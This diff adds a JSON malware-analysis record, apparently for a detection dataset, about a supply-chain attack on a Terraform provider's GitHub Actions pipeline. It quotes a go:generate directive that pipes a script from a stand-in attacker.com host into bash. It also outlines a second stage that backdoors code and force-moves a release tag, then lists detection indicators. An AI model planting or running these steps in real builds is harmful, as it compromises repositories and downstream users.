@@ -1,0 +1,114 @@
+{
+  "package_info": {
+    "package_name": "chainguard-cosign-terraform-provider",
+    "package_manager": "GitHub Actions / Terraform Registry",
+    "package_versions": "0.0.17 (and any unpinned version)",
+    "why_malicious": "The package, specifically its build pipeline and Terraform provider, is vulnerable to a supply chain attack due to untrusted code execution in GitHub Actions workflows triggered by pull_request_target. Malicious actors can inject code via go:generate directives in Go source files, resulting in arbitrary code execution within the CI pipeline. This enables attackers to compromise the repository, manipulate release tags, and poison release artifacts, potentially impacting downstream consumers such as Chainguard Docker images."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "During CI/CD pipeline execution when a pull_request_target event is triggered in GitHub Actions and go generate is run",
+        "file_location": "*.go (Go source files in the repository, specifically in code comments as go:generate directives)",
+        "required_permissions": [
+          "filesystem (to execute shell commands and write files)",
+          "network (to fetch remote scripts via curl)"
+        ]
+      },
+      "code_snippet": "//go:generate curl https://attacker.com/stage2.sh | bash",
+      "code_language": "go (directive triggers shell execution)",
+      "code_behavior": "During CI/CD pipeline execution triggered by pull_request_target, the go:generate directive executes a shell command that downloads a remote shell script from attacker.com using curl and pipes it to bash, resulting in arbitrary code execution within the build environment.",
+      "malice_analysis": {
+        "why_suspicious": "This go:generate directive causes the build system to execute arbitrary remote code by downloading and running a shell script from an attacker-controlled domain, which is a well-known supply chain attack vector.",
+        "violated_expectations": "Standard go:generate usage is limited to local code generation tools and does not involve fetching or executing remote scripts from untrusted sources.",
+        "similar_legitimate_use": "go:generate is legitimately used to invoke local code generators or formatters, but never to download and execute code from external domains.",
+        "key_indicators": [
+          "go:generate directive containing network operations (curl/wget)",
+          "curl | bash pattern in code generation comments",
+          "Reference to external, non-canonical domains in go:generate",
+          "Shell command execution embedded in Go source comments"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "During CI/CD pipeline execution, after the remote script is fetched and executed by the go:generate directive",
+        "file_location": "stage2.sh (shell script fetched from attacker-controlled server via go:generate directive)",
+        "required_permissions": [
+          "git (to manipulate repository state and tags)",
+          "network (for potential further exfiltration or communication)",
+          "filesystem (to modify source code and release artifacts)"
+        ]
+      },
+      "code_snippet": "git checkout -b attacker-branch\n# insert backdoor code\ngit commit -am 'backdoor'\ngit tag -f 0.0.17\n# poison release artifacts",
+      "code_language": "shell",
+      "code_behavior": "During CI/CD pipeline execution, after being downloaded and executed by the go:generate directive, the shell script creates a new branch, injects a backdoor into the codebase, commits the changes, force-updates the 0.0.17 release tag to point to the malicious commit, and modifies release artifacts, resulting in the inclusion of attacker-controlled code in official releases.",
+      "malice_analysis": {
+        "why_suspicious": "The script manipulates the repository by creating new branches, injecting backdoors, and force-pushing release tags to point to malicious commits, which directly compromises the integrity of release artifacts.",
+        "violated_expectations": "Legitimate CI scripts do not rewrite existing release tags or inject unauthorized code into release artifacts, especially not in an automated or unreviewed manner.",
+        "similar_legitimate_use": "Tag manipulation and artifact generation are common in release automation, but not in conjunction with unauthorized code injection or force-pushing tags to malicious commits.",
+        "key_indicators": [
+          "Automated creation of new branches and commits in CI context",
+          "Force-pushing existing release tags (e.g., 0.0.17) to new commits",
+          "Modification of release artifacts outside of standard release process",
+          "Presence of backdoor code injection steps in CI scripts"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Attacker submits a pull request from a fork containing malicious //go:generate directives in Go source files.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "Malicious go:generate directive is introduced into the codebase and awaits execution in the CI pipeline."
+    },
+    {
+      "step": 2,
+      "action": "CI pipeline is triggered by pull_request_target, checks out the untrusted code, and runs go generate, which executes the remote shell script via curl | bash.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "Remote stage2.sh script is downloaded from attacker.com and executed in the build environment."
+    },
+    {
+      "step": 3,
+      "action": "The stage2.sh script manipulates the repository: creates a new branch, injects a backdoor, commits the changes, force-pushes the 0.0.17 tag to the malicious commit, and poisons release artifacts.",
+      "implemented_by": [
+        "snippet_2"
+      ],
+      "leads_to": "Malicious code is included in official release artifacts and the release tag is compromised."
+    },
+    {
+      "step": 4,
+      "action": "If undetected, the poisoned provider is published and may be used downstream, potentially compromising Chainguard Docker images and other dependent systems.",
+      "implemented_by": [
+        "snippet_2"
+      ],
+      "leads_to": "Final goal: supply chain compromise of critical Docker images and downstream infrastructure."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "Presence of go:generate directives in Go source files that execute remote code via network operations (e.g., curl | bash or wget | sh)",
+      "CI/CD pipelines triggered by pull_request_target that checkout and build code from untrusted forks or contributors",
+      "Force-pushing or rewriting existing release tags (e.g., 0.0.17) in CI/CD environments",
+      "Automated modification or injection of code into release artifacts during CI runs"
+    ],
+    "file_indicators": [
+      "//go:generate curl ...",
+      "//go:generate wget ...",
+      "Introduction of go:generate directives with network access in *.go files",
+      "Absence of .terraform.lock.hcl (indicating unlocked provider versions and increased risk of supply chain attacks)"
+    ],
+    "network_indicators": [
+      "CI/CD build environments making outbound HTTP/HTTPS requests to non-standard or attacker-controlled domains (e.g., attacker.com)",
+      "Unexpected curl or wget activity during go generate or build steps in CI logs"
+    ],
+    "how_to_detect": "Scan Go source files for go:generate directives that invoke network operations or shell commands, especially those fetching and executing remote scripts. Audit CI/CD workflows, particularly those using pull_request_target, for steps that checkout and build code from untrusted sources. Monitor for force-pushes or rewrites of release tags and for automated modifications to release artifacts during CI runs. Set up alerts for build environments making outbound network requests to untrusted or non-canonical domains during code generation or build steps."
+  }
+}
